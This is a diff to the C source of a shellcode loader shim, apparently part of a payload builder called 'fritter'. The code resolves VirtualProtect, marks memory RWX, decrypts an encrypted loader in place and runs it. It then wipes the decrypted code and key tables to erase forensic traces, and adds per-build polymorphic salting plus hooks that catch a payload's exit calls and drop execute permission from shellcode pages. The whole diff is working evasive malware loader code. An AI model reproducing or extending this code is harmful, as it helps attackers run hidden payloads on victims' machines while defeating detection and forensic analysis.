@@ -101,13 +101,14 @@
 
 /* API type aliases */
 typedef BOOL  (WINAPI *VP_fn)(LPVOID, SIZE_T, DWORD, PDWORD);
-typedef void* (*LoaderEntry_fn)(void*);
+typedef void* (*LoaderEntry_fn)(void*, void*);
 
 /* Sentinels patched into the shim blob by fritter's build_loader.
    Only two survive from the veh_shim scheme; VEH_MODE and PAGE_KEY_*
    are retired. */
 #define SENTINEL_LOADER_OFFSET  0xDEAD0001u
 #define SENTINEL_LOADER_SIZE    0xDEAD0002u
+#define SENTINEL_PIC_TO_SHIM    0xDEAD0003u   /* bytes from shellcode start to this shim */
 
 /* ================================================================
  * Fn table
@@ -153,6 +154,13 @@ typedef struct {
    -fno-toplevel-reorder it lands AFTER DispatchShimEntry in .text.
    Fritter locates it by scanning for the marker bytes. */
 #define FN_TABLE_AREA_SIZE  (16 + MAX_FN_COUNT * sizeof(FN_ENTRY))
+/* Exit block for the generator's exit stub, right after the fn table:
+   {VirtualProtect, base, size, scratch}. */
+#define EXIT_BLOCK_SIZE     32
+/* Hook block for a payload that calls an exit API, after the exit block:
+   {hook, context, RtlRestoreContext, RtlExitUserThread, thread id}.
+   The first slot is ours; the loader fills the rest. */
+#define HOOK_BLOCK_SIZE     40
 extern volatile uint8_t g_fn_table_area[];
 
 /* Forward declarations */
@@ -162,6 +170,7 @@ static int    shim_stricmp(const char *a, const char *b);
 static int    shim_strcmp(const char *a, const char *b);
 static void   shim_xor_region(uint8_t *base, uint32_t size, uint8_t key);
 static void   shim_wipe_region(uint8_t *base, uint32_t size, uint8_t byte);
+static void   shim_exit_hook(uint32_t code);
 
 /* DispatcherEntry, placeholder in .disp so the section exists and
  * exe2h reports its offset in DISPATCH_SHIM_FNS[1].
@@ -185,9 +194,10 @@ IN_DISP void DispatcherEntry(void) {
 #ifdef _MSC_VER
 __declspec(code_seg(".text$a"))
 #endif
-void DispatchShimEntry(void *inst, void *shim_base) {
+void *DispatchShimEntry(void *inst, void *shim_base) {
     volatile uint32_t ldr_off  = SENTINEL_LOADER_OFFSET;
     volatile uint32_t ldr_sz   = SENTINEL_LOADER_SIZE;
+    volatile uint32_t pic_off  = SENTINEL_PIC_TO_SHIM;
 
     /* Salt site 1 - XOR-cancel into ldr_off (gated on bit 0). Same
        shape as the old shim's site 1: pair of volatile RMWs against
@@ -220,9 +230,9 @@ void DispatchShimEntry(void *inst, void *shim_base) {
 
     /* Resolve VirtualProtect */
     void *k32 = shim_find_dll(s_k32);
-    if (!k32) return;
+    if (!k32) return 0;
     VP_fn pVP = (VP_fn)shim_get_export(k32, s_vp);
-    if (!pVP) return;
+    if (!pVP) return 0;
 
     /* Read fn table: count + entries. The address of g_fn_table_area
        is RIP-rel from the shim's own code, so it's PIC. Layout is
@@ -234,19 +244,28 @@ void DispatchShimEntry(void *inst, void *shim_base) {
                ((uint32_t)ft[ 9] <<  8) |
                ((uint32_t)ft[10] << 16) |
                ((uint32_t)ft[11] << 24);
-    if (fn_count == 0 || fn_count > MAX_FN_COUNT) return;
+    if (fn_count == 0 || fn_count > MAX_FN_COUNT) return 0;
 
     FN_ENTRY *fns = (FN_ENTRY*)(g_fn_table_area + 16);
+
+    /* Full extent of the loader region. Under N>1 the dispatcher and
+       thunks sit past ldr_sz and are described by the tail fn entry, so
+       take the furthest end of any entry. */
+    uint32_t span = ldr_sz;
+    for (uint32_t i = 0; i < fn_count; i++) {
+        uint32_t e_end = fns[i].offset + fns[i].size;
+        if (e_end > span) span = e_end;
+    }
 
     /* Compute the page range covering the loader. RWX in one call:
        we're about to XOR-write instructions in place, then execute
        them. VirtualProtect grants both permissions atomically. */
     ULONG_PTR first_page = (ULONG_PTR)loader_base & ~(ULONG_PTR)0xFFF;
-    ULONG_PTR last_page  = ((ULONG_PTR)loader_base + ldr_sz - 1) & ~(ULONG_PTR)0xFFF;
+    ULONG_PTR last_page  = ((ULONG_PTR)loader_base + span - 1) & ~(ULONG_PTR)0xFFF;
     volatile SIZE_T protect_len = last_page - first_page + 0x1000;
     DWORD old;
 
-    if (!pVP((void*)first_page, protect_len, PAGE_EXECUTE_READWRITE, &old)) return;
+    if (!pVP((void*)first_page, protect_len, PAGE_EXECUTE_READWRITE, &old)) return 0;
 
     /* Decrypt each SHIM_DECRYPT entry in place. Under v1 whole-loader
        dispatch, one entry covers the entire loader with FN_FLAG_SHIM_DECRYPT
@@ -280,7 +299,10 @@ void DispatchShimEntry(void *inst, void *shim_base) {
        (oep-set mode; we never regain control in that case, so
        wipe/cleanup below is dead). */
     LoaderEntry_fn loader_entry = (LoaderEntry_fn)loader_base;
-    loader_entry(inst);
+    volatile uint64_t *hb = (volatile uint64_t*)(g_fn_table_area + FN_TABLE_AREA_SIZE + EXIT_BLOCK_SIZE);
+    hb[0] = (uint64_t)(ULONG_PTR)shim_exit_hook;
+    loader_entry(inst, (void*)hb);
+    for (uint32_t z = 0; z < HOOK_BLOCK_SIZE / 8; z++) hb[z] = 0;
 
     /* Salt site 4 - XOR-cancel into ldr_sz, gated on bit 12. */
     #if (SHIM_POLY_SALT & 0x00001000u)
@@ -298,8 +320,21 @@ void DispatchShimEntry(void *inst, void *shim_base) {
        with SHIM_WIPE_BYTE (per-build; 0 keeps original behavior).
        Destroys both plaintext instructions and any residual state.
        No re-encrypt: wipe is stronger and doesn't leave key traces. */
-    pVP((void*)first_page, protect_len, PAGE_READWRITE, &old);
-    shim_wipe_region((uint8_t*)first_page, (uint32_t)protect_len, SHIM_WIPE_BYTE);
+    /* Wipe exactly the loader bytes (still RWX), never the whole pages:
+       if the blob is not page-aligned, the first page also holds this
+       shim and the last may hold data that is not ours. */
+    shim_wipe_region((uint8_t*)loader_base, span, SHIM_WIPE_BYTE);
+
+    /* Drop X starting at the first page that begins inside the loader.
+       When the blob is page-aligned (the normal case) this is the same
+       range as before. An unaligned leading partial page is shared with
+       the shim and must stay executable for our own return path. */
+    {
+        ULONG_PTR rw_first = ((ULONG_PTR)loader_base + 0xFFF) & ~(ULONG_PTR)0xFFF;
+        ULONG_PTR rw_end   = first_page + protect_len;
+        if (rw_end > rw_first)
+            pVP((void*)rw_first, rw_end - rw_first, PAGE_READWRITE, &old);
+    }
 
     /* Wipe the fn table too - the keys are the only remaining artifact
        that could identify this loader's crypto state post-execution.
@@ -325,9 +360,48 @@ void DispatchShimEntry(void *inst, void *shim_base) {
         #endif
     }
 
-    /* Cannot drop X from the shim page - epilogue still executes on
-       return. Same rule as the old shim. The 4KB RWX shim page is
-       the residual footprint. */
+    /* This code cannot drop X from the page it runs on. Hand the exit
+       stub what it needs instead: it jumps into VirtualProtect with the
+       caller's stack restored, so the call returns to the host and no
+       page of the shellcode stays executable.
+       A partial page at either end is only included when the rest of it
+       is empty; otherwise it is shared with bytes that are not ours. */
+    {
+        ULONG_PTR lo = (ULONG_PTR)shim_base - pic_off;
+        ULONG_PTR hi = (ULONG_PTR)loader_base + span;
+        ULONG_PTR p;
+        volatile uint64_t *xb = (volatile uint64_t*)(g_fn_table_area + FN_TABLE_AREA_SIZE);
+
+        if (lo & 0xFFF) {
+            for (p = lo & ~(ULONG_PTR)0xFFF; p < lo && *(uint8_t*)p == 0; p++);
+            lo = (p == lo) ? (lo & ~(ULONG_PTR)0xFFF) : ((lo + 0xFFF) & ~(ULONG_PTR)0xFFF);
+        }
+        if (hi & 0xFFF) {
+            for (p = hi; (p & 0xFFF) != 0 && *(uint8_t*)p == 0; p++);
+            hi = (p & 0xFFF) ? (hi & ~(ULONG_PTR)0xFFF) : p;
+        }
+        if (hi <= lo) return 0;
+
+        xb[1] = (uint64_t)lo;
+        xb[2] = (uint64_t)(hi - lo);
+        xb[3] = 0;
+        xb[0] = (uint64_t)(ULONG_PTR)pVP;
+        return (void*)xb;
+    }
+}
+
+/* Stands in for the exit APIs of an EXE payload. On the thread that
+   entered the payload it resumes the loader where it captured its
+   context, so the loader cleans up and returns to its caller. Any other
+   thread just ends. */
+static void shim_exit_hook(uint32_t code) {
+    volatile uint64_t *hb = (volatile uint64_t*)(g_fn_table_area + FN_TABLE_AREA_SIZE + EXIT_BLOCK_SIZE);
+
+    if (hb[1] != 0 && hb[2] != 0 &&
+        hb[4] == (uint64_t)(ULONG_PTR)((void**)NtCurrentTeb())[9])
+        ((void (*)(void*, void*))(ULONG_PTR)hb[2])((void*)(ULONG_PTR)hb[1], 0);
+    if (hb[3] != 0)
+        ((void (*)(uint32_t))(ULONG_PTR)hb[3])(code);
 }
 
 /* ================================================================
@@ -448,7 +522,7 @@ void *memset(void *dst, int c, size_t n) {
    Only the 8-byte marker is initialized in source; fritter fills in
    count + entries at build time. The array is declared volatile so
    the wipe stores in DispatchShimEntry aren't dead-code eliminated. */
-IN_TEXT_Z volatile uint8_t g_fn_table_area[FN_TABLE_AREA_SIZE] = {
+IN_TEXT_Z volatile uint8_t g_fn_table_area[FN_TABLE_AREA_SIZE + EXIT_BLOCK_SIZE + HOOK_BLOCK_SIZE] = {
     (uint8_t)(FN_TABLE_MARKER_LO      ), (uint8_t)(FN_TABLE_MARKER_LO >>  8),
     (uint8_t)(FN_TABLE_MARKER_LO >> 16), (uint8_t)(FN_TABLE_MARKER_LO >> 24),
     (uint8_t)(FN_TABLE_MARKER_HI      ), (uint8_t)(FN_TABLE_MARKER_HI >>  8),
